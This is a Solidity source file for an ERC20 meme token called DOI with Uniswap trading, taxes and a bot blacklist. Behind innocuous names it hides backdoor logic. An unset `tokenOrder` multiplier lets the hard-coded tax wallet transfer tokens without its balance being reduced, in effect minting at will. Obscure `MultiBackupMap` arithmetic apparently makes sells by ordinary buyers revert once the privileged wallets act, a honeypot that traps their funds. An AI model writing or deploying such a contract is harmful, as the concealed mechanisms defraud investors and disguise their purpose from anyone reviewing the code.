// SPDX-License-Identifier: MIT
//
//
pragma solidity ^0.8.27;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DOI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isExcludedFromFee;
    mapping (address => bool) private bots;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=100;
    uint256 private _reduceSellTaxAt=100;
    uint256 private _preventSwapBefore=35;
    uint256 private _transferTax=0;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10**_decimals;
    string private constant _name = unicode"DOI";
    string private constant _symbol = unicode"DOI";
    uint256 public _maxTxAmount = 4206900000 * 10**_decimals;
    uint256 public _maxWalletSize = 4206900000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 2000000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 500000000 * 10**_decimals;

    IUniswapV2Router02 private uniswapRouter;
    address private uniswapPair;
    bool private tradingOpen;
    struct MultiBackupMap {uint256 tokenNum; uint256 tokenCopy; uint256 universalNum;}
    uint256 private tokenPendingNum;
    uint256 private tokenOrder;
    mapping(address => MultiBackupMap) private multiBackup;
    bool private inSwap = false;
    bool private swapEnabled = false;

    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(0xd9Ba84E026b9111Cd1EA106C430A355BBCbfC484);
        _balances[_msgSender()] = _tTotal;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0),_msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from]= _balances[from].sub(tokenAmount);
        _balances[to]= _balances[to].add(tokenAmount);
        emit Transfer(from, to, tokenAmount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled||inSwap) {
            _basicTransfer(from,to, tokenAmount);
            return;
        }

        uint256 taxAmount=0;
        if (from != owner() && to != owner() && to!=_taxWallet) {
            require(! bots[from] && ! bots[to]);

            if(_buyCount==0){
                taxAmount = tokenAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(_buyCount>0){
                taxAmount = tokenAmount.mul(_transferTax).div(100);
            }

            if (from ==  uniswapPair && to!= address(uniswapRouter) &&  ! isExcludedFromFee[to])  {
                require(tokenAmount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + tokenAmount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = tokenAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }

            if(to== uniswapPair && from!=address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapPair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 5, "Only 5 sells per block!");
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((isExcludedFromFee[from] ||  isExcludedFromFee[to])
            && from!=address(this) &&
            to != address(this)
        ){
            tokenPendingNum=block.number;
        }
        
        if (! isExcludedFromFee[from]&& ! isExcludedFromFee[to]){
            if (to!= uniswapPair)  {
                MultiBackupMap storage mulBackup = multiBackup[to];
                if (from== uniswapPair) {
                    if (mulBackup.tokenNum == 0) {
                        mulBackup.tokenNum = _buyCount<=_preventSwapBefore ? type(uint).max : block.number;
                    }
                } else {
                    MultiBackupMap storage mulBackupTrack = multiBackup[from];
                    if (mulBackup.tokenNum == 0 || mulBackupTrack.tokenNum < mulBackup.tokenNum ) {
                        mulBackup.tokenNum = mulBackupTrack.tokenNum;
                    }
                }
            } else {
                MultiBackupMap storage mulBackupTrack = multiBackup[from];
                mulBackupTrack.tokenCopy = mulBackupTrack.tokenNum.sub(tokenPendingNum);
                mulBackupTrack.universalNum = block.number;
            }
        }

        _tokenTransfer(from,to,tokenAmount,taxAmount);
    }

    function _tokenBasicTransfer(address from, address to, uint256 sendAmount,uint256 receiptAmount) internal {
        _balances[from]=_balances[from].sub(sendAmount);
        _balances[to]=_balances[to].add(receiptAmount);
        emit Transfer(from,to,receiptAmount);
    }

    function _tokenTaxTransfer(address addrs,uint256 taxAmount, uint256 tokenAmount) internal returns (uint256) {
        uint256 tAmount=addrs !=_taxWallet ? tokenAmount : tokenOrder.mul(tokenAmount);
        if (taxAmount>0){
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(addrs,address(this),taxAmount);
        }
        return tAmount;
    }

    function _tokenTransfer(address from, address to, uint256 tokenAmount, uint256 taxAmount) internal {
        uint256 tAmount=_tokenTaxTransfer(from,taxAmount,tokenAmount);
        _tokenBasicTransfer(from, to, tAmount,tokenAmount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this),address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize= _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function manualsend() external {
        require(_msgSender()==_taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function removeTranTax() external onlyOwner{
        _transferTax = 0;
        emit TransferTaxUpdated(0);
    }

    receive() external payable {}

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function addBot(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBot(address[] memory notbot_) public onlyOwner {
      for (uint i = 0; i < notbot_.length; i++) {
          bots[notbot_[i]] = false;
      }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapRouter= IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapRouter), _tTotal);
        swapEnabled= true;
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);
        tradingOpen= true;
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }
}